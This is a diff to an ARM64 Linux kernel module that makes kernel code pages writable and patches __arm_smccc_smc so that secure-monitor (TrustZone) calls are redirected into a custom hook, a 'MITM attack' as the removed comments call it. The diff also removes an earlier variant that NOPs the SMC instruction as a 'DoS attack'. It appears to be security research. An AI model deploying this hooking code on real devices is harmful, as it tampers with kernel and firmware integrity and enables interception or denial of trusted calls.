@@ -7,20 +7,13 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Nathan Castets");
 
-#define ARM_NOP_INST 0xd503201f
-#define ARM_SMC_INST 0xd4000003
-
 static pte_t *ptep;
 static struct mm_struct *mm;
+static uint8_t buff[16];
 
-asmlinkage void hook(unsigned long a0, unsigned long a1,
-		     unsigned long a2, unsigned long a3,
-		     unsigned long a4, unsigned long a5,
-		     unsigned long a6, unsigned long a7,
-		     struct arm_smccc_res *res,
-		     struct arm_smccc_quirk *quirk)
+void hook(void)
 {
-	printk(KERN_INFO "r0 : %lx", a0);
+	printk(KERN_INFO "WE'RE IN!");
 	
 	__asm__("smc #0;"
 		"ldr x4, [sp];"
@@ -31,8 +24,11 @@ asmlinkage void hook(unsigned long a0, unsigned long a1,
 		"ldr x9, [x4];"
 		"cmp x9, #0x1;"
 		"b.ne 0x00000028;"
-		"str x6, [x4,#8];"
-		"ret;");
+		"str x6, [x4,#8];");
+
+	printk(KERN_INFO "routine is OK");
+
+	__asm__("ret;");
 }
 
 static void set_pte_write(void)
@@ -61,12 +57,13 @@ static void set_pte_rdonly(void)
 
 static void disable_smc_call(void)
 {
+	uint32_t i;
+	
 	set_pte_write();
-
-	/* DoS attack */
-	*(uint32_t *)__arm_smccc_smc = ARM_NOP_INST;
-
-	/* MITM attack */
+		 
+	for (i = 0; i < 16; i++)
+		buff[i] = *(uint8_t *)(__arm_smccc_smc + i);
+	
 	*(uint32_t *)(__arm_smccc_smc + 0) = 0x58000048;
 	*(uint32_t *)(__arm_smccc_smc + 4) = 0xd61f0100;
 	*(uint32_t *)(__arm_smccc_smc + 8) =
@@ -74,21 +71,17 @@ static void disable_smc_call(void)
 	*(uint32_t *)(__arm_smccc_smc + 12) =
 		((unsigned long)hook & 0xffffffff00000000) >> 32;
 	
-	set_pte_rdonly();
+	set_pte_rdonly();	
 }
 
 static void enable_smc_call(void)
 {
+	uint32_t i;
+	
 	set_pte_write();
-
-	/* DoS attack */
-	*(uint32_t *)__arm_smccc_smc = ARM_SMC_INST;
-
-	/* MITM attack */
-	*(uint32_t *)(__arm_smccc_smc + 0) = ARM_SMC_INST;
-	*(uint32_t *)(__arm_smccc_smc + 4) = 0xe40340f9;
-	*(uint32_t *)(__arm_smccc_smc + 8) = 0x800400a9;
-	*(uint32_t *)(__arm_smccc_smc + 12) = 0x820c01a9;
+	
+	for (i = 0; i < 16; i++)
+		*(uint8_t *)(__arm_smccc_smc + i) = buff[i];
 	
 	set_pte_rdonly();
 }
@@ -101,7 +94,7 @@ int init_module(void)
 	pmd_t *pmdp;
 
 	printk(KERN_INFO "alpha module started");
-	
+
 	mm = (struct mm_struct *)kallsyms_lookup_name("init_mm");
 	init_mm = *mm;
 
